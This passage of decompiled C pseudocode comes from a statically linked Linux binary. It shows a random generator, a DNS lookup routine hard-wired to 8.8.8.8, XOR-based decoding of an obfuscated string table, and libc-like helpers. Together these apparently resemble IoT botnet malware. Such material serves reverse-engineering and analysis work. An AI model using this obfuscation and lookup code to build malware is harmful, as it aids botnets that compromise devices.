                   ((char)(DAT_08055114 / 0x21 << 5) + (char)(DAT_08055114 / 0x21));
        param_1 = param_1 + 1;
      }
      else {
        param_2 = param_2 - 4;
        uVar1 = DAT_08055108 << 0xb ^ DAT_08055108;
        uVar3 = DAT_08055110 >> 0x13 ^ DAT_08055110 ^ uVar1;
        DAT_08055114 = uVar3 ^ uVar1 >> 8;
        *param_1 = *(char *)((int)local_31 + (DAT_08055114 >> 3 & 0x1f));
        param_1[1] = *(char *)((int)local_31 + (DAT_08055114 >> 0xb & 0x1f));
        param_1[2] = *(char *)((int)local_31 + (DAT_08055114 >> 0x13 & 0x1f));
        param_1[3] = *(char *)((int)local_31 + (uVar3 >> 0x1b));
        param_1 = param_1 + 4;
      }
      DAT_08055108 = local_44;
      uVar1 = DAT_0805510c;
    } while (0 < (int)param_2);
  }
  return;
}



void FUN_0804f5e0(uint *param_1,int param_2)

{
  uint uVar1;
  uint uVar2;
  uint local_14;
  
  if (0 < param_2) {
    local_14 = DAT_08055110;
    uVar2 = DAT_08055108;
    uVar1 = local_14;
    do {
      local_14 = uVar1;
      DAT_08055110 = DAT_08055114;
      DAT_08055108 = DAT_0805510c;
      if (param_2 < 4) {
        if (param_2 == 1) {
          DAT_0805510c = local_14;
          uVar2 = uVar2 << 0xb ^ uVar2;
          DAT_08055114 = DAT_08055110 >> 0x13 ^ DAT_08055110 ^ uVar2 ^ uVar2 >> 8;
          *(char *)param_1 = (char)DAT_08055114;
          return;
        }
        param_2 = param_2 + -2;
        uVar2 = uVar2 << 0xb ^ uVar2;
        DAT_08055114 = DAT_08055110 >> 0x13 ^ DAT_08055110 ^ uVar2 ^ uVar2 >> 8;
        *(short *)param_1 = (short)DAT_08055114;
        param_1 = (uint *)((int)param_1 + 2);
      }
      else {
        param_2 = param_2 + -4;
        uVar2 = uVar2 << 0xb ^ uVar2;
        DAT_08055114 = DAT_08055110 >> 0x13 ^ DAT_08055110 ^ uVar2 ^ uVar2 >> 8;
        *param_1 = DAT_08055114;
        param_1 = param_1 + 1;
      }
      uVar2 = DAT_08055108;
      DAT_0805510c = local_14;
      uVar1 = DAT_08055110;
    } while (0 < param_2);
    DAT_0805510c = local_14;
  }
  return;
}



undefined4 FUN_0804f6c0(int param_1)

{
  undefined4 uVar1;
  undefined4 uStack_c;
  
  if (param_1 != 0) {
    if (*(int *)(param_1 + 4) != 0) {
      FUN_08051550(*(int *)(param_1 + 4));
    }
    uVar1 = FUN_08051550();
    return uVar1;
  }
  return uStack_c;
}



byte * FUN_0804f700(char *param_1)

{
  short *psVar1;
  char cVar2;
  byte bVar3;
  undefined2 uVar4;
  short sVar5;
  int iVar6;
  uint uVar7;
  char *pcVar8;
  int iVar9;
  uint *puVar10;
  char *pcVar11;
  undefined4 uVar12;
  char *extraout_ECX;
  byte *pbVar13;
  short *psVar14;
  byte *pbVar15;
  short sVar16;
  undefined4 *puVar17;
  char cVar18;
  char *pcVar19;
  short asStack_d0ac [24542];
  undefined4 uStack_10f0;
  undefined4 *puStack_10ec;
  uint *puStack_10e8;
  undefined4 uStack_10e4;
  undefined4 uStack_10e0;
  undefined4 *local_10dc;
  undefined4 *puStack_10d8;
  char *pcStack_10d4;
  char *pcStack_10d0;
  char *local_10c0;
  byte *local_10bc;
  undefined4 local_10b8;
  char *local_10b4;
  short local_10ac;
  ushort local_10a6;
  char local_10a0 [2036];
  short local_8ac;
  undefined2 local_8aa;
  undefined2 local_8a8;
  char local_8a0;
  char local_89f [2035];
  uint local_ac [32];
  undefined4 local_2c;
  uint local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  
  cVar18 = '\0';
  puStack_10d8 = (undefined4 *)0x8;
  local_10dc = (undefined4 *)0x1;
  uStack_10e0 = 0x804f71c;
  local_10bc = (byte *)FUN_08051070();
  local_10b4 = &local_8a0;
  local_10dc = (undefined4 *)param_1;
  uStack_10e0 = 0x804f733;
  iVar6 = FUN_08050620();
  pcVar8 = local_89f;
  pcVar19 = local_10b4;
  for (iVar6 = iVar6 + 1; pcVar8 = pcVar8 + 1, pcVar11 = pcVar8 + -1, 0 < iVar6; iVar6 = iVar6 + -1)
  {
    cVar2 = *param_1;
    if ((cVar2 == '.') || (cVar2 == '\0')) {
      *pcVar19 = cVar18;
      cVar18 = '\0';
    }
    else {
      pcVar8[-1] = cVar2;
      pcVar11 = pcVar19;
      cVar18 = cVar18 + '\x01';
    }
    param_1 = param_1 + 1;
    pcVar19 = pcVar11;
  }
  pcVar8[-1] = '\0';
  local_10dc = (undefined4 *)local_10b4;
  uStack_10e0 = 0x804f779;
  iVar6 = FUN_08050620();
  local_2c = 0;
  local_28 = 0;
  local_24 = 0;
  local_20 = 0;
  pcVar19 = local_10b4 + iVar6;
  local_10dc = (undefined4 *)local_10b4;
  uStack_10e0 = 0x804f7b8;
  iVar6 = FUN_08050620();
  local_10c0 = (char *)(iVar6 + 0x11);
  uStack_10e0 = 0x804f7c7;
  uVar7 = FUN_0804f450();
  iVar6 = 1;
  sVar16 = (short)uVar7 + (short)(uVar7 / 0xffff);
  local_10b8 = (char *)CONCAT22(local_10b8._2_2_,sVar16);
  puStack_10d8 = (undefined4 *)0x10;
  local_10dc = &local_2c;
  uStack_10e0 = 0x804f7f9;
  FUN_080506b0();
  local_2c = CONCAT22(local_2c._2_2_,2);
  local_10dc = (undefined4 *)0x8080808;
  uStack_10e0 = 0x804f80f;
  local_28 = FUN_08052518();
  local_10dc = (undefined4 *)0x35;
  uStack_10e0 = 0x804f822;
  uVar4 = FUN_08052544();
  local_2c = CONCAT22(uVar4,(undefined2)local_2c);
  local_10dc = (undefined4 *)0x100;
  uStack_10e0 = 0x804f83e;
  local_8ac = sVar16;
  local_8aa = FUN_08052544();
  local_10dc = (undefined4 *)0x1;
  uStack_10e0 = 0x804f852;
  local_8a8 = FUN_08052544();
  local_10dc = (undefined4 *)0x1;
  uStack_10e0 = 0x804f866;
  uVar4 = FUN_08052544();
  *(undefined2 *)(pcVar19 + 1) = uVar4;
  local_10dc = (undefined4 *)0x1;
  uStack_10e0 = 0x804f876;
  pcVar8 = (char *)FUN_08052544();
  puVar17 = (undefined4 *)0xffffffff;
  *(short *)(pcVar19 + 3) = (short)pcVar8;
  do {
    if (puVar17 != (undefined4 *)0xffffffff) {
      uStack_10e0 = 0x804f88e;
      local_10dc = puVar17;
      pcVar8 = (char *)FUN_08053125();
    }
    pcStack_10d4 = (char *)0x0;
    puStack_10d8 = (undefined4 *)0x2;
    local_10dc = (undefined4 *)0x2;
    uStack_10e0 = 0x804f89d;
    pcStack_10d0 = pcVar8;
    puVar17 = (undefined4 *)FUN_08052834();
    if (puVar17 == (undefined4 *)0xffffffff) {
LAB_0804f9d4:
      local_10dc = (undefined4 *)0x1;
      uStack_10e0 = 0x804f9de;
      pcVar8 = (char *)FUN_080531dc();
    }
    else {
      pcStack_10d4 = (char *)0x10;
      puStack_10d8 = &local_2c;
      uStack_10e0 = 0x804f8bc;
      local_10dc = puVar17;
      pcStack_10d0 = pcVar19;
      iVar9 = FUN_08052418();
      if (iVar9 == -1) goto LAB_0804f9d4;
      pcStack_10d0 = (char *)0x4000;
      pcStack_10d4 = local_10c0;
      puStack_10d8 = (undefined4 *)&local_8ac;
      uStack_10e0 = 0x804f8de;
      local_10dc = puVar17;
      iVar9 = FUN_08052768();
      if (iVar9 == -1) goto LAB_0804f9d4;
      pcStack_10d4 = (char *)0x0;
      local_10dc = (undefined4 *)0x3;
      uStack_10e0 = 0x804f8f3;
      puStack_10d8 = puVar17;
      pcStack_10d0 = extraout_ECX;
      uVar7 = FUN_08050d80();
      pcStack_10d4 = (char *)(uVar7 | 0x800);
      local_10dc = (undefined4 *)0x4;
      uStack_10e0 = 0x804f902;
      puStack_10d8 = puVar17;
      FUN_08050d80();
      puVar10 = local_ac + 1;
      do {
        puVar10[-1] = 0;
        puVar10 = puVar10 + 1;
      } while (puVar10 != &local_28);
      uVar7 = (uint)puVar17 >> 5;
      pcVar19 = (char *)((uint)puVar17 & 0x1f);
      local_1c = 5;
      local_18 = 0;
      local_ac[uVar7] = local_ac[uVar7] | 1 << (sbyte)pcVar19;
      local_10dc = &local_1c;
      uStack_10e0 = 0;
      uStack_10e4 = 0;
      puStack_10e8 = local_ac;
      puStack_10ec = (undefined4 *)((int)puVar17 + 1);
      uStack_10f0 = 0x804f97a;
      pcVar8 = (char *)FUN_080529e0();
      if (pcVar8 == (char *)0xffffffff) goto LAB_0804f9e6;
      if (pcVar8 != (char *)0x0) {
        pcVar8 = (char *)(local_ac[uVar7] >> (sbyte)pcVar19);
        if (((uint)pcVar8 & 1) == 0) goto LAB_0804f9e6;
        puStack_10d8 = (undefined4 *)0x0;
        local_10dc = (undefined4 *)0x0;
        uStack_10e0 = 0x4000;
        uStack_10e4 = 0x800;
        puStack_10e8 = (uint *)&local_10ac;
        uStack_10f0 = 0x804f9b0;
        puStack_10ec = puVar17;
        pcStack_10d4 = pcVar8;
        pcStack_10d0 = pcVar8;
        pcVar11 = (char *)FUN_08052710();
        local_10dc = (undefined4 *)local_10b4;
        uStack_10e0 = 0x804f9bf;
        iVar9 = FUN_08050620();
        pcVar8 = (char *)(iVar9 + 0x11U);
        if ((char *)(iVar9 + 0x11U) <= pcVar11) {
          local_10dc = (undefined4 *)local_10a0;
          uStack_10e0 = 0x804fa1f;
          local_10b4 = (char *)local_10dc;
          iVar9 = FUN_08050620();
          pbVar15 = (byte *)(local_10b4 + iVar9 + 5);
          pcVar8 = local_10b8;
          if ((local_10ac == (short)local_10b8) &&
             (pcVar8 = (char *)CONCAT22((short)((uint)local_10b8 >> 0x10),local_10a6),
             local_10a6 != 0)) {
            local_10dc = (undefined4 *)(uint)local_10a6;
            uStack_10e0 = 0x804fa4d;
            uVar4 = FUN_080526e4();
            local_10b8 = (char *)CONCAT22(uVar4,(undefined2)local_10b8);
            break;
          }
        }
      }
    }
    if (iVar6 == 5) goto LAB_0804f9e6;
    iVar6 = iVar6 + 1;
  } while( true );
LAB_0804fa55:
  sVar16 = local_10b8._2_2_ + -1;
  local_10b8 = (char *)CONCAT22(sVar16,(undefined2)local_10b8);
  if (sVar16 == -1) {
LAB_0804f9e6:
    uStack_10e0 = 0x804f9ef;
    local_10dc = puVar17;
    FUN_08053125();
    if (*local_10bc != 0) {
      return local_10bc;
    }
    local_10dc = *(undefined4 **)(local_10bc + 4);
    if (local_10dc != (undefined4 *)0x0) {
      uStack_10e0 = 0x804fb1a;
      FUN_08051550();
    }
    local_10dc = (undefined4 *)local_10bc;
    uStack_10e0 = 0x804fb2a;
    FUN_08051550();
    return (byte *)0x0;
  }
  iVar9 = 0;
  iVar6 = 1;
  for (pbVar13 = pbVar15; bVar3 = *pbVar13, bVar3 != 0; pbVar13 = pbVar13 + 1) {
    while (0xbf < bVar3) {
      iVar9 = 1;
      pbVar13 = (byte *)((int)asStack_d0ac + (uint)bVar3 * 0x100 + (uint)pbVar13[1]);
      bVar3 = *pbVar13;
      if (bVar3 == 0) goto LAB_0804faa2;
    }
    iVar6 = iVar6 + (uint)(iVar9 == 0);
  }
LAB_0804faa2:
  psVar14 = (short *)(pbVar15 + iVar6 + iVar9);
  sVar16 = *psVar14;
  local_10dc = (undefined4 *)0x1;
  uStack_10e0 = 0x804fab4;
  sVar5 = FUN_08052544();
  psVar1 = psVar14 + 5;
  if (sVar16 != sVar5) {
LAB_0804fac3:
    iVar6 = 0;
    iVar9 = 1;
    for (psVar14 = psVar1; bVar3 = *(byte *)psVar14, bVar3 != 0;
        psVar14 = (short *)((int)psVar14 + 1)) {
      while (0xbf < bVar3) {
        iVar6 = 1;
        psVar14 = (short *)((int)asStack_d0ac +
                           (uint)bVar3 * 0x100 + (uint)*(byte *)((int)psVar14 + 1));
        bVar3 = *(byte *)psVar14;
        if (bVar3 == 0) goto LAB_0804faff;
      }
      iVar9 = iVar9 + (uint)(iVar6 == 0);
    }
LAB_0804faff:
    pbVar15 = (byte *)((int)psVar1 + iVar9 + iVar6);
    goto LAB_0804fa55;
  }
  sVar16 = psVar14[1];
  local_10dc = (undefined4 *)0x1;
  uStack_10e0 = 0x804fb6a;
  sVar5 = FUN_08052544();
  if (sVar16 != sVar5) goto LAB_0804fac3;
  local_10dc = (undefined4 *)(uint)(ushort)psVar14[4];
  uStack_10e0 = 0x804fb88;
  uVar12 = FUN_080526e4();
  if ((short)uVar12 == 4) {
    local_14 = *(undefined4 *)(psVar14 + 5);
    pcStack_10d4 = (char *)CONCAT31((int3)((uint)uVar12 >> 8),*(char *)((int)psVar14 + 0xd));
    puStack_10d8 = (undefined4 *)((uint)*local_10bc * 4 + 4);
    local_10dc = *(undefined4 **)(local_10bc + 4);
    uStack_10e0 = 0x804fbd6;
    pcStack_10d0 = pcStack_10d4;
    iVar6 = FUN_08051f70();
    bVar3 = *local_10bc;
    *(int *)(local_10bc + 4) = iVar6;
    *(undefined4 *)(iVar6 + (uint)bVar3 * 4) = local_14;
    *local_10bc = bVar3 + 1;
  }
  local_10dc = (undefined4 *)(uint)(ushort)psVar14[4];
  uStack_10e0 = 0x804fc07;
  uVar7 = FUN_080526e4();
  pbVar15 = (byte *)((uVar7 & 0xffff) + (int)psVar1);
  goto LAB_0804fa55;
}



undefined4 FUN_0804fc20(int param_1,uint *param_2)

{
  if (param_2 != (uint *)0x0) {
    *param_2 = *(uint *)(&DAT_080556c4 + param_1 * 8) & 0xffff;
  }
  return *(undefined4 *)(&DAT_080556c0 + param_1 * 8);
}



void FUN_0804fc50(byte param_1)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  undefined4 uVar4;
  int iVar5;
  int iVar6;
  
  uVar4 = DAT_08055080;
  iVar1 = (uint)param_1 * 8;
  piVar2 = (int *)(&DAT_080556c0 + iVar1);
  if (*(short *)(&DAT_080556c4 + iVar1) != 0) {
    uVar3 = (uint)DAT_08055080 >> 0x18;
    iVar5 = 0;
    do {
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)uVar4;
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)((uint)uVar4 >> 8);
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)((uint)uVar4 >> 0x10);
      iVar6 = iVar5 + 1;
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)uVar3;
      iVar5 = iVar6;
    } while (iVar6 < (int)(*(uint *)(&DAT_080556c4 + iVar1) & 0xffff));
  }
  return;
}



void FUN_0804fcd0(byte param_1)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  undefined4 uVar4;
  int iVar5;
  int iVar6;
  
  uVar4 = DAT_08055080;
  iVar1 = (uint)param_1 * 8;
  piVar2 = (int *)(&DAT_080556c0 + iVar1);
  if (*(short *)(&DAT_080556c4 + iVar1) != 0) {
    uVar3 = (uint)DAT_08055080 >> 0x18;
    iVar5 = 0;
    do {
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)uVar4;
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)((uint)uVar4 >> 8);
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)((uint)uVar4 >> 0x10);
      iVar6 = iVar5 + 1;
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)uVar3;
      iVar5 = iVar6;
    } while (iVar6 < (int)(*(uint *)(&DAT_080556c4 + iVar1) & 0xffff));
  }
  return;
}



void FUN_08050620(char *param_1)

{
  char cVar1;
  int iVar2;
  
  iVar2 = 0;
  cVar1 = *param_1;
  while (cVar1 != '\0') {
    iVar2 = iVar2 + 1;
    cVar1 = param_1[iVar2];
  }
  return;
}



int FUN_08050640(char *param_1,char *param_2)

{
  char cVar1;
  char cVar2;
  int iVar3;
  int iVar4;
  
  iVar4 = 0;
  cVar2 = *param_2;
  cVar1 = cVar2;
  while (iVar3 = iVar4, cVar1 != '\0') {
    iVar4 = iVar4 + 1;
    cVar1 = param_2[iVar4];
  }
  while( true ) {
    *param_1 = cVar2;
    param_1 = param_1 + 1;
    if (iVar3 + -1 == -1) break;
    cVar2 = param_2[1];
    param_2 = param_2 + 1;
    iVar3 = iVar3 + -1;
  }
  return iVar4;
}



void FUN_08050680(int param_1,int param_2,int param_3)

{
  int iVar1;
  
  if (param_3 != 0) {
    iVar1 = 0;
    do {
      *(undefined *)(iVar1 + param_1) = *(undefined *)(iVar1 + param_2);
      iVar1 = iVar1 + 1;
    } while (iVar1 != param_3);
  }
  return;
}



void FUN_080506b0(int param_1,int param_2)

{
  int iVar1;
  
  if (param_2 != 0) {
    iVar1 = 0;
    do {
      *(undefined *)(iVar1 + param_1) = 0;
      iVar1 = iVar1 + 1;
    } while (iVar1 != param_2);
  }
  return;
}



int FUN_080506d0(int param_1,int param_2,int param_3,int param_4)

{
  int iVar1;
  int iVar2;
  
  if ((param_4 <= param_2) && (0 < param_2)) {
    iVar2 = 0;
    iVar1 = 0;
    do {
      if (*(char *)(iVar2 + param_1) == *(char *)(param_3 + iVar1)) {
        iVar1 = iVar1 + 1;
        if (iVar1 == param_4) {
          return iVar2 + 1;
        }
      }
      else {
        iVar1 = 0;
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 != param_2);
  }
  return -1;
}



uint FUN_08050720(char *param_1,uint param_2)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  char *pcVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  
  do {
    do {
      pcVar4 = param_1;
      cVar1 = *pcVar4;
      param_1 = pcVar4 + 1;
    } while (cVar1 == ' ');
  } while ((cVar1 == '\t') || (cVar1 == '\n'));
  if (cVar1 == '-') {
    cVar1 = *param_1;
    uVar3 = 0x80000000;
    param_1 = pcVar4 + 2;
    bVar2 = true;
  }
  else {
    if (cVar1 == '+') {
      cVar1 = *param_1;
      param_1 = pcVar4 + 2;
    }
    uVar3 = 0x7fffffff;
    bVar2 = false;
  }
  uVar5 = 0;
  iVar7 = 0;
  do {
    if ((byte)(cVar1 - 0x30U) < 10) {
      iVar6 = cVar1 + -0x30;
    }
    else {
      iVar6 = 0x37;
      if (0x19 < (byte)(cVar1 + 0xbfU)) {
        if (0x19 < (byte)(cVar1 + 0x9fU)) {
LAB_080507b5:
          if (-1 < iVar7) {
            if (bVar2) {
              uVar5 = -uVar5;
            }
            return uVar5;
          }
          return 0x80000000 - !bVar2;
        }
        iVar6 = 0x57;
      }
      iVar6 = cVar1 - iVar6;
    }
    if ((int)param_2 <= iVar6) goto LAB_080507b5;
    if (((iVar7 < 0) || (uVar3 / param_2 < uVar5)) ||
       ((uVar5 == uVar3 / param_2 && ((int)(uVar3 % param_2) < iVar6)))) {
      iVar7 = -1;
    }
    else {
      iVar7 = 1;
      uVar5 = iVar6 + param_2 * uVar5;
    }
    cVar1 = *param_1;
    param_1 = param_1 + 1;
  } while( true );
}



uint FUN_08050820(uint param_1,int param_2,undefined4 param_3)

{
  char *pcVar1;
  int iVar2;
  undefined4 in_ECX;
  undefined4 extraout_ECX;
  int iVar3;
  int iVar4;
  
  iVar3 = 0;
  do {
    iVar2 = FUN_08053178(param_3,iVar3 + param_1,1,in_ECX);
    iVar4 = iVar3;
    if (iVar2 != 1) break;
    iVar4 = iVar3 + 1;
    if (param_2 <= iVar4) {
      return param_1;
    }
    pcVar1 = (char *)(iVar3 + param_1);
    in_ECX = extraout_ECX;
    iVar3 = iVar4;
  } while (*pcVar1 != '\n');
  return param_1 & -(uint)(iVar4 != 0);
}



undefined4 FUN_08050870(void)

{
  undefined4 *puVar1;
  int iVar2;
  undefined2 local_1c;
  undefined2 local_1a;
  undefined4 local_18;
  undefined4 local_c;
  
  local_c = 0x10;
  puVar1 = (undefined4 *)FUN_08050d40();
  *puVar1 = 0;
  iVar2 = FUN_08052834(2,2,0);
  local_18 = 0;
  if (iVar2 != -1) {
    local_1c = 2;
    local_18 = FUN_08052518(0x8080808);
    local_1a = FUN_08052544(0x35);
    FUN_08052418(iVar2,&local_1c,0x10);
    FUN_08052470(iVar2,&local_1c,&local_c);
    FUN_08053125(iVar2);
  }
  return local_18;
}



int FUN_08050900(byte *param_1,int param_2,char *param_3)

{
  char cVar1;
  byte bVar2;
  byte bVar3;
  byte *pbVar4;
  int iVar5;
  int local_14;
  
  local_14 = 0;
  cVar1 = *param_3;
  while (cVar1 != '\0') {
    local_14 = local_14 + 1;
    cVar1 = param_3[local_14];
  }
  iVar5 = 0;
  pbVar4 = param_1;
  if (0 < param_2) {
    do {
      bVar2 = *pbVar4;
      bVar3 = param_3[iVar5];
      pbVar4 = pbVar4 + 1;
      if ((byte)(bVar2 + 0xbf) < 0x1a) {
        bVar2 = bVar2 | 0x60;
      }
      if ((byte)(bVar3 + 0xbf) < 0x1a) {
        bVar3 = bVar3 | 0x60;
      }
      if (bVar2 == bVar3) {
        iVar5 = iVar5 + 1;
        if (local_14 == iVar5) {
          return (int)pbVar4 - (int)param_1;
        }
      }
      else {
        iVar5 = 0;
      }
      param_2 = param_2 + -1;
    } while (0 < param_2);
  }
  return -1;
}



undefined4 FUN_08050980(char *param_1,char *param_2)

{
  char cVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = 0;
  cVar1 = *param_1;
  while (cVar1 != '\0') {
    iVar3 = iVar3 + 1;
    cVar1 = param_1[iVar3];
  }
  iVar2 = 0;
  cVar1 = *param_2;
  while (cVar1 != '\0') {
    iVar2 = iVar2 + 1;
    cVar1 = param_2[iVar2];
  }
  if (iVar3 == iVar2) {
    while( true ) {
      iVar3 = iVar3 + -1;
      if (iVar3 == -1) {
        return 1;
      }
      if (*param_1 != *param_2) break;
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
    }
  }
  return 0;
}



undefined4 FUN_080509d0(char *param_1,char *param_2,int param_3)

{
  char cVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = 0;
  cVar1 = *param_1;
  while (cVar1 != '\0') {
    iVar3 = iVar3 + 1;
    cVar1 = param_1[iVar3];
  }
  iVar2 = 0;
  cVar1 = *param_2;
  while (cVar1 != '\0') {
    iVar2 = iVar2 + 1;
    cVar1 = param_2[iVar2];
  }
  if ((param_3 <= iVar3) && (param_3 <= iVar2)) {
    while( true ) {
      param_3 = param_3 + -1;
      if (param_3 == -1) {
        return 1;
      }
      if (*param_1 != *param_2) break;
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
    }
  }
  return 0;
}



char * FUN_08050a20(uint param_1,uint param_2,char *param_3)

{
  char cVar1;
  bool bVar2;
  char cVar3;
  char *pcVar4;
  char *pcVar5;
  int iVar6;
  int iVar7;
  char acStack_33 [34];
  undefined local_11;
  
  if (param_3 != (char *)0x0) {
    if (param_1 == 0) {
      *param_3 = '0';
      param_3[1] = '\0';
      return param_3;
    }
    local_11 = 0;
    if ((param_2 == 10) && ((int)param_1 < 0)) {
      bVar2 = true;
      param_1 = -param_1;
    }
    else {
      bVar2 = false;
    }
    iVar7 = 0x20;
    do {
      iVar6 = iVar7;
      cVar1 = (char)((ulonglong)param_1 % (ulonglong)param_2);
      cVar3 = cVar1 + '0';
      if (9 < (int)((ulonglong)param_1 % (ulonglong)param_2)) {
        cVar3 = cVar1 + '7';
      }
      acStack_33[iVar6 + 1] = cVar3;
      param_1 = param_1 / param_2;
      iVar7 = iVar6 + -1;
    } while (param_1 != 0);
    if (bVar2) {
      acStack_33[iVar6] = '-';
      iVar6 = iVar6 + -1;
    }
    pcVar4 = acStack_33 + iVar6 + 1;
    iVar7 = 0;
    cVar1 = *pcVar4;
    while (pcVar5 = param_3, cVar1 != '\0') {
      iVar7 = iVar7 + 1;
      cVar1 = pcVar4[iVar7];
    }
    do {
      iVar7 = iVar7 + -1;
      *pcVar5 = *pcVar4;
      pcVar4 = pcVar4 + 1;
      pcVar5 = pcVar5 + 1;
    } while (iVar7 != -1);
  }
  return param_3;
}



undefined4 FUN_08050ae4(undefined4 *param_1)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08053125(*param_1);
  FUN_08051550(param_1);
  return uVar1;
}



undefined8 FUN_08050b08(undefined4 param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 uStack_c;
  
  iVar1 = FUN_08050ef8(param_1,0x90000);
  piVar2 = (int *)0x0;
  if (-1 < iVar1) {
    piVar2 = (int *)FUN_08051070(1,0x81c,0,0);
    if (piVar2 == (int *)0x0) {
      FUN_08050f70();
      piVar2 = (int *)0x0;
    }
    else {
      *piVar2 = iVar1;
    }
  }
  return CONCAT44(uStack_c,piVar2);
}



int FUN_08050b50(int param_1)

{
  undefined4 uVar1;
  undefined4 uVar2;
  int iVar3;
  int *piVar4;
  
  if (*(int *)(param_1 + 0x10) <= *(int *)(param_1 + 0xc)) {
    iVar3 = FUN_08050f70();
    if (iVar3 < 1) {
      if ((iVar3 < 0) && (iVar3 != -2)) {
        piVar4 = (int *)FUN_08050d40();
        *piVar4 = -iVar3;
      }
      return 0;
    }
    *(int *)(param_1 + 0x10) = iVar3;
    *(undefined4 *)(param_1 + 0xc) = 0;
  }
  iVar3 = *(int *)(param_1 + 0xc) + 0x1c + param_1;
  uVar1 = *(undefined4 *)(iVar3 + 8);
  *(uint *)(param_1 + 0xc) = (uint)*(ushort *)(iVar3 + 0x10) + *(int *)(param_1 + 0xc);
  uVar2 = *(undefined4 *)(iVar3 + 0xc);
  *(undefined4 *)(param_1 + 4) = uVar1;
  *(undefined4 *)(param_1 + 8) = uVar2;
  return iVar3;
}



void FUN_08050bbd(void)

{
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_08050bbe(code *param_1,int param_2,char **param_3)

{
  char **ppcVar1;
  char cVar2;
  char *pcVar3;
  char *pcVar4;
  char **ppcVar5;
  char *pcVar6;
  char *pcVar7;
  int iVar8;
  undefined4 uVar9;
  undefined4 in_ECX;
  char **ppcVar10;
  code **ppcVar11;
  int iVar12;
  int *in_GS_OFFSET;
  char *local_c0 [6];
  undefined4 local_a8;
  int local_94;
  int local_90;
  int local_8c;
  int local_88;
  undefined4 local_80;
  int local_64;
  undefined4 local_5c;
  undefined4 local_40;
  undefined4 local_28;
  undefined4 uStack_24;
  undefined4 local_20;
  undefined4 uStack_1c;
  undefined4 local_18;
  undefined4 uStack_14;
  
  pcVar3 = *param_3;
  ppcVar1 = param_3 + param_2 + 1;
  ppcVar5 = ppcVar1;
  do {
    ppcVar10 = ppcVar5;
    ppcVar5 = ppcVar10 + 1;
  } while (*ppcVar10 != (char *)0x0);
  _DAT_08055554 = ppcVar1;
  FUN_08052dbc(local_c0,0,0x98,in_ECX);
  DAT_08055890 = ppcVar10 + 1;
  for (; pcVar4 = ppcVar10[1], pcVar4 != (char *)0x0; ppcVar10 = ppcVar10 + 2) {
    if (pcVar4 < (char *)0x26) {
      local_c0[(int)pcVar4] = ppcVar10[2];
    }
  }
  _DAT_08055860 = local_80;
  _DAT_080558b4 = local_40;
  _DAT_08055898 = local_a8;
  pcVar4 = pcVar3;
  pcVar6 = pcVar3;
  if (pcVar3 != (char *)0x0) {
    while( true ) {
      _DAT_08055118 = pcVar6;
      pcVar7 = pcVar4 + 1;
      cVar2 = *pcVar4;
      _DAT_0805511c = pcVar3;
      if (cVar2 == '\0') break;
      pcVar4 = pcVar7;
      pcVar6 = _DAT_08055118;
      if (cVar2 == '/') {
        pcVar6 = pcVar7;
      }
    }
  }
  FUN_080532b0(local_c0);
  FUN_08050bbd(local_5c);
  if (((local_94 != local_90) || (local_8c != local_88)) || (local_64 != 0)) {
    local_28 = 0;
    uStack_24 = 0;
    uStack_1c = 0;
    uStack_14 = 0;
    iVar12 = 0;
    local_20 = 1;
    local_18 = 2;
    FUN_08050f70();
    do {
      if (((*(byte *)((int)&uStack_24 + iVar12 * 8 + 2) & 0x20) != 0) &&
         (iVar8 = FUN_08050f70(), iVar8 < 0)) {
        do {
                    // WARNING: Do nothing block with infinite loop
        } while( true );
      }
      iVar12 = iVar12 + 1;
    } while (iVar12 != 3);
    _DAT_08055888 = 1;
  }
  uVar9 = FUN_08048094();
  for (ppcVar11 = (code **)&DAT_08055048; ppcVar11 < &DAT_08055048; ppcVar11 = ppcVar11 + 1) {
    uVar9 = (**ppcVar11)();
  }
  uVar9 = (*param_1)(param_2,param_3,ppcVar1,uVar9);
  FUN_08050d4d(uVar9);
  return *in_GS_OFFSET + 0x28;
}



int FUN_08050d40(void)

{
  int *in_GS_OFFSET;
  
  return *in_GS_OFFSET + 0x28;
}



void FUN_08050d4c(void)

{
  return;
}



int FUN_08050d4d(undefined4 param_1)

{
  int iVar1;
  code **ppcVar2;
  int iStack_38;
  int iStack_34;
  undefined4 uStack_18;
  int iStack_14;
  undefined auStack_c [8];
  
  ppcVar2 = (code **)&DAT_08055048;
  FUN_08050d4c();
  while (&DAT_08055048 < ppcVar2) {
    ppcVar2 = ppcVar2 + -1;
    (**ppcVar2)();
  }
  FUN_08054687();
  FUN_0805441d();
  FUN_080533f4(param_1);
  if (iStack_14 != 4) {
    if (iStack_14 == 0xe) {
      iVar1 = thunk_FUN_08050fbb(0xdd,uStack_18,0xe,0x8050d74,0,0,0,auStack_c);
      goto LAB_08050ee1;
    }
    if (iStack_14 == 9) {
      iVar1 = FUN_08050f70();
      if (iVar1 == -0x16) {
        iVar1 = FUN_08050f70();
        return iVar1;
      }
      if (iVar1 == 0) {
        if (iStack_38 != 2) {
          return iStack_34;
        }
        return -iStack_34;
      }
      goto LAB_08050ee1;
    }
    if (iStack_14 == 0x406) {
      iVar1 = FUN_08050f70();
      if (iVar1 == -0x16) {
